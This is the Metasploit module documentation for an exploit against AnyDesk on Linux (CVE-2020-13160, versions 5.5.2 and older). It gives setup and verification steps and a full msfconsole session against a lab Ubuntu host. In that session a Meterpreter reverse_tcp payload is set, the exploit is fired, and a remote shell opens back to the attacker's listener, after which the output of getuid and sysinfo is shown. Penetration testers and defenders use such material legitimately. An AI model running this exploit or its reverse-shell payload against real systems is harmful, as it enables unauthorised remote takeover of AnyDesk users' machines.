## Vulnerable Application

This vulnerability affects Linux versions 5.5.2 and older. Old versions of AnyDesk can be downloaded from their site at
https://download.anydesk.com/linux/. Use the `.deb` package for an Ubuntu installation.

The `check` method on this exploit will send an AnyDesk discovery frame to the target host, which will cause the
target to respond with its own discovery frame. Each of these are sent from a random source port to the default AnyDesk
discovery service port of 50001. To configure the listening service in Metasploit, change the `SRVHOST` and `SRVPORT`
options. The exploit will use this method to detect the remote hostname and confirm that the operating system is Linux
before proceeding.

## Verification Steps

1. Install the application
1. Start the AnyDesk GUI. A window will open, leave it running.
1. Start `msfconsole`
1. Do: `use exploit/linux/misc/cve_2020_13160_anydesk`
1. Set the module options
1. Do: `exploit`
1. You should get a shell.

## Options

### SRVHOST

This option is used to specify the host on which to listen for discovery frames from AnyDesk.

### SRVPORT

This option is used to specify the port on which to listen for discovery frames from AnyDesk.

## Scenarios

### Ubuntu 18.04 x64

```
msf5 exploit(linux/misc/cve_2020_13160_anydesk) > use exploit/linux/misc/cve_2020_13160_anydesk 
msf5 exploit(linux/misc/cve_2020_13160_anydesk) > set RHOSTS 192.168.159.33
RHOSTS => 192.168.159.33
msf5 exploit(linux/misc/cve_2020_13160_anydesk) > set PAYLOAD linux/x64/meterpreter/reverse_tcp 
PAYLOAD => linux/x64/meterpreter/reverse_tcp
msf5 exploit(linux/misc/cve_2020_13160_anydesk) > check
[*] 192.168.159.33:50001 - The service is running, but could not be validated. Remote hostname: ubuntu
msf5 exploit(linux/misc/cve_2020_13160_anydesk) > exploit

[*] Started reverse TCP handler on 192.168.250.87:4444 
[*] Discovered the remote service (hostname: ubuntu, os: linux)
[*] Sent exploit frame, waiting for the GUI to refresh to trigger the vulnerability...
[*] Sending stage (3012516 bytes) to 192.168.250.237
[*] Meterpreter session 1 opened (192.168.250.87:4444 -> 192.168.250.237:51044) at 2020-06-17 10:21:44 -0400

meterpreter > getuid
Server username: no-user @ ubuntu (uid=1000, gid=1000, euid=1000, egid=1000)
meterpreter > sysinfo
Computer     : 192.168.159.33
OS           : Ubuntu 18.04 (Linux 5.3.0-59-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```
